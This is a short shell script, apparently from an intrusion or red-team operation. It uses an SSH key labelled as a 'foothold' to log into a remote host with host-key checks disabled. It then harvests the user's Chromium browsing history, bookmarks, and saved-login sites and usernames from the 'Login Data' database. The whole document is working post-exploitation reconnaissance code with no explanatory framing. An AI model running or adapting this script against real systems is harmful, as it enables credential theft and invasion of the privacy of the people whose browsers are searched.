SSH="ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i $HOME/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
$SSH 'bash -s' <<'REMOTE'
cd ~/.config/chromium/Default 2>/dev/null || { echo no-profile; exit; }
ls -la | head -40
echo "### urls from History"
python3 - <<'PY'
import sqlite3,shutil
try:
 shutil.copy('History','/tmp/h.db')
 c=sqlite3.connect('/tmp/h.db')
 for u,t,v in c.execute("select url,title,visit_count from urls order by last_visit_time desc limit 80"):
  print(v,t,'|',u)
except Exception as e: print('ERR',e)
PY
echo "### bookmarks"
cat Bookmarks 2>/dev/null | head -c 4000
echo
echo "### login data hosts"
python3 - <<'PY'
import sqlite3,shutil
try:
 shutil.copy('Login Data','/tmp/l.db')
 c=sqlite3.connect('/tmp/l.db')
 for r in c.execute("select origin_url,username_value from logins"):
  print(r)
except Exception as e: print('ERR',e)
PY
REMOTE
